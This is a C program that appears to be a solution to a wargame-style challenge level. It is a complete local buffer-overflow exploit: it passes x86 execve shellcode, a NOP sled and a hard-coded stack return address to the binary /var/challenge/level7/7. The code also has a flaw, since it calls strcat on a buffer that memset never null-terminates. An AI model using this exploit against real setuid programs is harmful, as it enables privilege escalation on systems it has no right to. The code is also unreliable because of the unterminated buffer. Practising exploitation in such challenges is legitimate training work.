#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    // Shellcode to execute "/usr/local/bin/l33t" with padding for alignment
    char *shellcode = 
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14"
        "\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t"
        "\x90\x90\x90\x90\x90";

    // NOP padding for the exploit
    char padding[65];
    memset(padding, '\x90', sizeof(padding) - 1);  
    padding[sizeof(padding) - 1] = '\0';         

    // Overflow string with return addresses
    char exploit[100];
    memset(exploit, '\x90', 24);                  
    strcat(exploit, "\x40\xff\xff\xbf");          
    strcat(exploit, "\x40\xff\xff\xbf");          
    strcat(exploit, "\x40\xff\xff\xbf");

    // Arguments for the vulnerable binary
    char *args[] = {
        "/var/challenge/level7/7",  
        shellcode,                 
        padding,                   
        exploit,                   
        NULL
    };

    // Execute /var/challenge/level7/7 with crafted arguments
    execve(args[0], args, NULL);

    return 0;
}



